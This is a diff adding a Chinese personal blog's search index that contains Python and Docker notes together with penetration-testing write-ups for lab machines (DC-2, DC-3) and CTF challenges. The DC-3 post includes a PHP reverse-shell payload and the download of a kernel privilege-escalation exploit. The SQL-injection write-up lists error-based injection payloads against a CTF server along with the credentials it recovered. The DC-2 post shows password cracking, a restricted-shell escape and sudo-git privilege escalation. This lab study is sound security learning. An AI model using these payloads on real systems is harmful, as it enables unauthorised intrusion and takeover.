@@ -1,0 +1,366 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>python高级特性</title>
+    <url>/2019/12/11/python%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7/</url>
+    <content><![CDATA[<h3 id="Python高级特性"><a href="#Python高级特性" class="headerlink" title="Python高级特性"></a>Python高级特性</h3><h4 id="切片（slice）"><a href="#切片（slice）" class="headerlink" title="切片（slice）"></a>切片（slice）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>]</span><br></pre></td></tr></table></figure>
+
+<p>​    取前三个元素</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L[<span class="number">0</span>:<span class="number">3</span>]</span><br></pre></td></tr></table></figure>
+
+<p><code>L[-1]</code>可以取倒数第一个元素，可以倒数切片，如取后两个元素</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L[<span class="number">-2</span>,<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>
+
+<h5 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建0-99的数列</span></span><br><span class="line">L = list(range(<span class="number">100</span>))</span><br><span class="line"><span class="comment"># 取前十个数</span></span><br><span class="line">L[:<span class="number">10</span>]</span><br><span class="line"><span class="comment"># 后十个数</span></span><br><span class="line">L[<span class="number">-10</span>:]</span><br><span class="line"><span class="comment"># 前11到20个数</span></span><br><span class="line">L[<span class="number">10</span>:<span class="number">20</span>]</span><br><span class="line"><span class="comment"># 前十个数，每两个取一个</span></span><br><span class="line">L[:<span class="number">10</span>:<span class="number">2</span>]</span><br><span class="line"><span class="comment"># 所有数，没5个取一个</span></span><br><span class="line">L[::<span class="number">5</span>]</span><br><span class="line"><span class="comment"># 复制一个list</span></span><br><span class="line">L[:]</span><br></pre></td></tr></table></figure>
+
+<h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><ul>
+<li><p>元组（tuple）也是一种list，唯一区别时tuple不可变，因此也可以切片。</p>
+</li>
+<li><p>字符串<code>&#39;aaa&#39;</code>也可以看作list，每个字符就是一个元素，因此也可切片。</p>
+</li>
+</ul>
+<h4 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h4><p>给定一个<strong>列表、元组、字符串等</strong>，可以用<code>for</code>循环遍历</p>
+<h5 id="dict迭代"><a href="#dict迭代" class="headerlink" title="dict迭代"></a>dict迭代</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">'a'</span>:<span class="number">1</span>, <span class="string">'b'</span>:<span class="number">2</span>, <span class="string">'c'</span>:<span class="number">3</span>&#125;</span><br><span class="line"><span class="comment"># 遍历key</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> d:</span><br><span class="line">    print(key)</span><br><span class="line"><span class="comment"># 遍历value</span></span><br><span class="line"><span class="keyword">for</span> vlaue <span class="keyword">in</span> d.values():</span><br><span class="line">    print(value)</span><br><span class="line"><span class="comment"># 同时遍历key value</span></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> d.items():</span><br><span class="line">    <span class="keyword">print</span> k,v</span><br></pre></td></tr></table></figure>
+
+<h5 id="如何判断对象是否可迭代"><a href="#如何判断对象是否可迭代" class="headerlink" title="如何判断对象是否可迭代"></a>如何判断对象是否可迭代</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</span><br><span class="line"><span class="comment"># 判断字符串是否可迭代 True</span></span><br><span class="line">isinstance(<span class="string">'abc'</span>, Interable)</span><br><span class="line"><span class="comment"># 判断list是否可迭代 True</span></span><br><span class="line">isinstance([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], Interable) </span><br><span class="line"><span class="comment"># 判断整数是否可迭代 False</span></span><br><span class="line">isinstance(<span class="number">123</span>, Interable)</span><br></pre></td></tr></table></figure>
+
+<h5 id="把一个list变成索引-元素对"><a href="#把一个list变成索引-元素对" class="headerlink" title="把一个list变成索引-元素对"></a>把一个list变成索引-元素对</h5><p> Python内置的<code>enumerate</code>函数可以把一个list变成索引-元素对，这样就可以在<code>for</code>循环中同时迭代索引和元素本身： </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i,value <span class="keyword">in</span> enumerate([<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>]):</span><br><span class="line">    print(i, value)</span><br></pre></td></tr></table></figure>
+
+<h4 id="列表生成器"><a href="#列表生成器" class="headerlink" title="列表生成器"></a>列表生成器</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成[1*1,2*2,3*3,...10*10]的列表</span></span><br><span class="line">L = [x*x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line"><span class="comment"># 仅生成偶数的平方</span></span><br><span class="line">L = [x*x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>) <span class="keyword">if</span> x%<span class="number">2</span>=<span class="number">0</span>]</span><br><span class="line"><span class="comment"># 两层循环生成全排列</span></span><br><span class="line">L = [m+n <span class="keyword">for</span> m <span class="keyword">in</span> <span class="string">'ABC'</span> <span class="keyword">for</span> n <span class="keyword">in</span> <span class="string">'XYZ'</span>]</span><br><span class="line"><span class="comment"># 使用两个变量生成list</span></span><br><span class="line">d = &#123;<span class="string">'x'</span>:<span class="string">'A'</span>, <span class="string">'y'</span>:<span class="string">'B'</span>, <span class="string">'z'</span>:<span class="string">'C'</span>&#125;</span><br><span class="line">l = [k + <span class="string">'='</span> + v <span class="keyword">for</span> k,v <span class="keyword">in</span> d.items()]</span><br></pre></td></tr></table></figure>
+
+<h4 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h4><p>创建generator最简单的方法是把列表生成器的<code>[]</code>改成<code>()</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">g = (x*x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line"><span class="keyword">print</span> next(g) <span class="comment"># 0</span></span><br><span class="line"><span class="keyword">print</span> next(g) <span class="comment"># 1</span></span><br></pre></td></tr></table></figure>
+
+<p>generator保存的是算法，每次调用<code>next(g)</code>，就计算出<code>g</code>的下一个元素的值，直到计算到最后一个元素，没有更多的元素时，抛出<code>StopIteration</code>的错误。不断调用<code>next(g)</code>实在是太变态了，正确的方法是使用<code>for</code>循环，因为generator也是可迭代对象：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">g = (x*x <span class="keyword">for</span> x range(<span class="number">10</span>))</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> g:</span><br><span class="line">    print(n)</span><br></pre></td></tr></table></figure>
+
+<h5 id="使用函数实现生成器"><a href="#使用函数实现生成器" class="headerlink" title="使用函数实现生成器"></a>使用函数实现生成器</h5><h6 id="例-斐波那契数"><a href="#例-斐波那契数" class="headerlink" title="例 斐波那契数"></a>例 斐波那契数</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打印函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(max)</span>:</span></span><br><span class="line">    n,a,b = <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; max:</span><br><span class="line">        print(b)</span><br><span class="line">        a,b = b, a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p> 函数和generator仅一步之遥。要把<code>fib</code>函数变成generator，只需要把<code>print(b)</code>改为<code>yield b</code>就可以了： </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义generator</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(max)</span>:</span></span><br><span class="line">    n,a,b = <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; max:</span><br><span class="line">        <span class="keyword">yield</span> b</span><br><span class="line">        a,b = b, a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">g = fib(<span class="number">6</span>)</span><br></pre></td></tr></table></figure>
+
+<p> 但是用<code>for</code>循环调用generator时，发现拿不到generator的<code>return</code>语句的返回值。如果想要拿到返回值，必须捕获<code>StopIteration</code>错误，返回值包含在<code>StopIteration</code>的<code>value</code>中： </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">g = fib(<span class="number">6</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = next(g)</span><br><span class="line">        print(<span class="string">'g:'</span>,x)</span><br><span class="line">    <span class="keyword">except</span> StopIteration <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'Generator return value:'</span>, e.value)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h4><p> 可以被<code>next()</code>函数调用并不断返回下一个值的对象称为迭代器：<code>Iterator</code>。 </p>
+<p>凡是可作用于<code>for</code>循环的对象都是<code>Iterable</code>类型；</p>
+<p>凡是可作用于<code>next()</code>函数的对象都是<code>Iterator</code>类型，它们表示一个惰性计算的序列；</p>
+<p>集合数据类型如<code>list</code>、<code>dict</code>、<code>str</code>等是<code>Iterable</code>但不是<code>Iterator</code>，不过可以通过<code>iter()</code>函数获得一个<code>Iterator</code>对象。</p>
+<p>Python的<code>for</code>循环本质上就是通过不断调用<code>next()</code>函数实现的，例如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for x in [1, 2, 3, 4, 5]:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>
+
+<p>实际上完全等价于：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 首先获得Iterator对象:</span></span><br><span class="line">it = iter([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="comment"># 循环:</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 获得下一个值:</span></span><br><span class="line">        x = next(it)</span><br><span class="line">    <span class="keyword">except</span> StopIteration:</span><br><span class="line">        <span class="comment"># 遇到StopIteration就退出循环</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-3</title>
+    <url>/2019/11/26/DC-3/</url>
+    <content><![CDATA[<h3 id="Nmap扫描"><a href="#Nmap扫描" class="headerlink" title="Nmap扫描"></a>Nmap扫描</h3><p>nmap一顿操作发现只开了80端口</p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 目录扫描发现后台</span></span><br><span class="line">dirb http://192.168.1.119</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DC-3/image-20191126115221921.png" alt="image-20191126115221921"></p>
+<h3 id="爆破后台admin密码"><a href="#爆破后台admin密码" class="headerlink" title="爆破后台admin密码"></a>爆破后台admin密码</h3><p><img src="/images/DC-3/image-20191126142151422.png" alt="image-20191126142151422"></p>
+<p><img src="/images/DC-3/image-20191126142135027.png" alt="image-20191126142135027"></p>
+<h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><p>用户名为 <code>admin</code> 密码 <code>snoopy</code></p>
+<p><img src="/images/DC-3/image-20191126162058640.png" alt="image-20191126162058640"></p>
+<h3 id="创建反弹shell页面"><a href="#创建反弹shell页面" class="headerlink" title="创建反弹shell页面"></a>创建反弹shell页面</h3><p><img src="/images/DC-3/image-20191126162242932.png" alt="image-20191126162242932"></p>
+<h5 id="随便选择一个模板创建文件并保存"><a href="#随便选择一个模板创建文件并保存" class="headerlink" title="随便选择一个模板创建文件并保存"></a>随便选择一个模板创建文件并保存</h5><p><img src="/images/DC-3/image-20191126162439227.png" alt="image-20191126162439227"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 反弹shell的代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip =<span class="number">192.168</span><span class="number">.1</span><span class="number">.118</span>;</span><br><span class="line">$port=<span class="number">4444</span></span><br><span class="line">$sock = fsockopen($ip, $port);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; $sock,</span><br><span class="line">        <span class="number">1</span> =&gt; $sock,</span><br><span class="line">        <span class="number">2</span> =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(<span class="string">'/bin/sh'</span>, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="kali设置监听"><a href="#kali设置监听" class="headerlink" title="kali设置监听"></a>kali设置监听</h5><p><img src="/images/DC-3/image-20191126162525556.png" alt="image-20191126162525556"></p>
+<p>访问 <code>http://192.168.1.119/templates/beez3/xxx.php</code> 获得shell</p>
+<p><img src="/images/DC-3/image-20191126162647774.png" alt="image-20191126162647774"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查找exp <code>searchsploit ubuntu 16.04</code></p>
+<p><img src="/images/DC-3/image-20191126162909920.png" alt="image-20191126162909920"></p>
+<p>wegt下载到目标主机</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget clone https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DC-3/image-20191126163228301.png" alt="image-20191126163228301"></p>
+<p>解压后分别找到exp目录</p>
+<ul>
+<li>首先执行<code>./compile.sh</code></li>
+<li>然后执行<code>./doubleput</code>，获取root权限</li>
+</ul>
+<p><img src="/images/DC-3/image-20191126163534422.png" alt="image-20191126163534422"></p>
+<h3 id="切换至root目录getflag"><a href="#切换至root目录getflag" class="headerlink" title="切换至root目录getflag"></a>切换至root目录getflag</h3><p><img src="/images/DC-3/image-20191126163730214.png" alt="image-20191126163730214"></p>
+]]></content>
+      <tags>
+        <tag>靶机渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli_writeup</title>
+    <url>/2019/11/22/sqli_writeup/</url>
+    <content><![CDATA[<p><a href="http://123.206.87.240:9001/sql/" target="_blank" rel="noopener">http://123.206.87.240:9001/sql/</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name=admin&quot; or 1=1#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br><span class="line"></span><br><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="../images/sqli_writeup/image-20191122144400086.png" alt="image-20191122144400086"></p>
+<p><img src="../images/sqli_writeup/image-20191122144957715.png" alt="image-20191122144957715"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x666c616731),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/sqli_writeup/image-20191122145138742.png" alt="image-20191122145138742"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select group_concat(flag1) from flag1),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br><span class="line"></span><br><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,substr((select group_concat(flag1) from flag1),30,40),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure>
+
+<p>ed6b28e684817d9efcaf802979e57aea</p>
+<p><img src="../images/sqli_writeup/image-20191122145221023.png" alt="image-20191122145221023"></p>
+<p><img src="../images/sqli_writeup/image-20191122145510508.png" alt="image-20191122145510508"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x77686f616d69),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="../images/sqli_writeup/image-20191122145657918.png" alt="image-20191122145657918"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,substr((select group_concat(w_passwd) from whoami),30,40),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure>
+
+<p> 9db3bae8316e95698ed679aa109c1925     admin123, </p>
+<p><img src="../images/sqli_writeup/image-20191122145845056.png" alt="image-20191122145845056"></p>
+<p> BlCkJaCk    5FF69C838EDD75995197C516C677A416  passwd123, </p>
+<p>AdMiNhEhE admin123,</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,(select w_name from whoami  limit 1,1),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br><span class="line"></span><br><span class="line">admin_name=admin&quot; or updatexml(1,concat(0x7e,substr((select w_passwd from whoami  limit 1,1),20,40),0x7e),1)#&amp;admin_passwd=2333&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="../images/sqli_writeup/image-20191122150513616.png" alt="image-20191122150513616"></p>
+<p><img src="../images/sqli_writeup/image-20191122150732450.png" alt="image-20191122150732450"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">5c58eccac46d7ce0d7a60f4694622c57x</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="../images/sqli_writeup/image-20191122161637079.png" alt="image-20191122161637079"></p>
+<p><img src="../images/sqli_writeup/image-20191122161733403.png" alt="image-20191122161733403"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>4th-CyberEarth-writeup</title>
+    <url>/2019/11/21/4th-CyberEarth-writeup/</url>
+    <content><![CDATA[<p> 其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统 </p>
+<p><img src="/images/4th-CyberEarth-writeup/image-20191121114301743.png" alt="image-20191121114301743"></p>
+<p><img src="/images/4th-CyberEarth-writeup/image-20191121114332488.png" alt="image-20191121114332488"></p>
+<p>再次点击</p>
+<p><img src="/images/4th-CyberEarth-writeup/image-20191121114451585.png" alt="image-20191121114451585"></p>
+<p>php伪协议读源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?page=php:<span class="comment">//filter/convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/4th-CyberEarth-writeup/image-20191121114840371.png" alt="image-20191121114840371"></p>
+<p>base64解码</p>
+<p><img src="/images/4th-CyberEarth-writeup/image-20191121114952459.png" alt="image-20191121114952459"></p>
+<p>代码中发现关键信息</p>
+<ul>
+<li>修改 X-Forwarded-For 头为127.0.0.1</li>
+<li></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>靶机渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>docker笔记</title>
+    <url>/2019/11/20/docker%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><h3 id="docker镜像获取"><a href="#docker镜像获取" class="headerlink" title="docker镜像获取"></a>docker镜像获取</h3><ul>
+<li>导入导出</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">load --input /xx/xxx.tar</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>pull docker hub</li>
+</ul>
+<h4 id="开启容器"><a href="#开启容器" class="headerlink" title="开启容器"></a>开启容器</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8000:80 &lt;image&gt;</span><br><span class="line"></span><br><span class="line">docker run -t -d -p 2222:22 7b9ab7293e68 ## -p 2222:22 将容器22端口映射到宿主机2222端口</span><br><span class="line"></span><br><span class="line">docker run -it &lt;image&gt; /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h4 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -it &lt;container_id&gt; /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h4 id="关闭容器"><a href="#关闭容器" class="headerlink" title="关闭容器"></a>关闭容器</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker stop &lt;container_id&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker cp file &lt;container_id&gt;：/xxx/xxx/xxx/</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看运行中的镜像"><a href="#查看运行中的镜像" class="headerlink" title="查看运行中的镜像"></a>查看运行中的镜像</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+
+<h4 id="保存镜像"><a href="#保存镜像" class="headerlink" title="保存镜像"></a>保存镜像</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker</span><br></pre></td></tr></table></figure>
+
+<h4 id="连接镜像"><a href="#连接镜像" class="headerlink" title="连接镜像"></a>连接镜像</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker attach &lt;container_id&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="导入-导出镜像"><a href="#导入-导出镜像" class="headerlink" title="导入/导出镜像"></a>导入/导出镜像</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker import/export</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run －t －i &lt;image&gt; 用镜像创建一个容器</span><br><span class="line">docker pull image 拉拽镜像</span><br><span class="line">docker images 查看可用镜像</span><br><span class="line">docker ps 查看运行的容器</span><br><span class="line">docker ps -a 查看所有的容器</span><br><span class="line">docker stop &lt;container id&gt; 停止该容器</span><br><span class="line">docker start &lt;container id&gt; 开始该容器</span><br><span class="line">docker attach &lt;container id&gt;与该容器交互</span><br><span class="line">docker commit &lt;container id&gt; &lt;new id&gt;创建新的镜像</span><br><span class="line">docker rm &lt;container id&gt; 删除容器</span><br><span class="line">docker rmi &lt;image name&gt; 删除镜像</span><br><span class="line">docker cp &lt;containerId&gt;:/file/path/within/container /host/path/target 从Docker容器内拷贝文件到主机上</span><br><span class="line">docker commit -a 't0ng' &lt;container id&gt; &lt;容器名&gt;：latest 将容器打包成镜像</span><br></pre></td></tr></table></figure>
+
+<h4 id="run-命令参数"><a href="#run-命令参数" class="headerlink" title="run 命令参数"></a>run 命令参数</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；</span><br><span class="line"></span><br><span class="line">-d: 后台运行容器，并返回容器ID；</span><br><span class="line"></span><br><span class="line">-i: 以交互模式运行容器，通常与 -t 同时使用；</span><br><span class="line"></span><br><span class="line">-P: 随机端口映射，容器内部端口随机映射到主机的高端口</span><br><span class="line"></span><br><span class="line">-p: 指定端口映射，格式为：主机(宿主)端口:容器端口</span><br><span class="line"></span><br><span class="line">-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</span><br><span class="line"></span><br><span class="line">--name="nginx-lb": 为容器指定一个名称；</span><br><span class="line"></span><br><span class="line">--dns 8.8.8.8: 指定容器使用的DNS服务器，默认和宿主一致；</span><br><span class="line"></span><br><span class="line">--dns-search example.com: 指定容器DNS搜索域名，默认和宿主一致；</span><br><span class="line"></span><br><span class="line">-h "mars": 指定容器的hostname；</span><br><span class="line"></span><br><span class="line">-e username="ritchie": 设置环境变量；</span><br><span class="line"></span><br><span class="line">--env-file=[]: 从指定文件读入环境变量；</span><br><span class="line"></span><br><span class="line">--cpuset="0-2" or --cpuset="0,1,2": 绑定容器到指定CPU运行；</span><br><span class="line"></span><br><span class="line">-m :设置容器使用内存最大值；</span><br><span class="line"></span><br><span class="line">--net="bridge": 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型；</span><br><span class="line"></span><br><span class="line">--link=[]: 添加链接到另一个容器；</span><br><span class="line"></span><br><span class="line">--expose=[]: 开放一个端口或一组端口；</span><br><span class="line"></span><br><span class="line">--volume , -v: 绑定一个卷</span><br></pre></td></tr></table></figure>
+
+<h4 id="mysql安装配置"><a href="#mysql安装配置" class="headerlink" title="mysql安装配置"></a>mysql安装配置</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker 中下载 mysql </span></span><br><span class="line">docker pull mysql </span><br><span class="line"><span class="meta">#</span><span class="bash">启动 </span></span><br><span class="line">docker run --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=Lzslov123! -d mysql </span><br><span class="line"><span class="meta">#</span><span class="bash">进入容器 </span></span><br><span class="line">docker exec -it mysql bash </span><br><span class="line"><span class="meta">#</span><span class="bash">登录mysql </span></span><br><span class="line">mysql -u root -p ALTER USER 'root'@'localhost' IDENTIFIED BY 'Lzslov123!'; </span><br><span class="line"><span class="meta">#</span><span class="bash">添加远程登录用户 </span></span><br><span class="line">CREATE USER 'liaozesong'@'%' IDENTIFIED WITH mysql_native_password BY 'Lzslov123!'; </span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO 'liaozesong'@'%';</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>工具学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-2</title>
+    <url>/2019/11/20/DC-2/</url>
+    <content><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><ul>
+<li><p>修改host文件解析域名</p>
+</li>
+<li><p>cewl爬取信息生成密码<code>cewl dc-2/ -w dict.txt</code></p>
+</li>
+<li><p>wpscan扫描wordpress <code>wpscan –-url dc-2/ -P dict.txt</code></p>
+</li>
+<li><p>切换shell，修改环境变量</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a </span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>发现root权限执行的命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>git提权</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo git -p --help</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h2 id="打靶流程"><a href="#打靶流程" class="headerlink" title="打靶流程"></a>打靶流程</h2><h3 id="1、主机发现"><a href="#1、主机发现" class="headerlink" title="1、主机发现"></a>1、主机发现</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.43.0/24</span><br><span class="line">nmap -sV -p 1-65535 192.168.43.183</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DC-2/1574127544326.png" alt="1574127544326"></p>
+<p><img src="/images/DC-2/1574127569904.png" alt="1574127569904"></p>
+<p><strong>发现主机 ，开放80 http服务和7744 ssh服务</strong></p>
+<h3 id="2、修改host文件，访问web页面"><a href="#2、修改host文件，访问web页面" class="headerlink" title="2、修改host文件，访问web页面"></a>2、修改host文件，访问web页面</h3><p>直接访问ip地址发现域名解析，解析的域名<code>dc-2</code>无法访问</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">host文件位于c:/windows/system32/drivers/etc/hosts</span><br><span class="line">将 192.168.43.183 DC-2加入到host</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DC-2/1574127826501.png" alt="1574127826501"></p>
+<ul>
+<li>发现使用<strong>WordPress</strong></li>
+<li>出现<strong>flag1</strong>和提示</li>
+</ul>
+<p><img src="/images/DC-2/1574127876095.png" alt="1574127876095"></p>
+<h3 id="3、cewl生成密码"><a href="#3、cewl生成密码" class="headerlink" title="3、cewl生成密码"></a>3、cewl生成密码</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cewl dc-2/ -w dict.txt		#-w选项表示将爬取生成的字典输出为文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/DC-2/1574129389297.png" alt="1574129389297"></p>
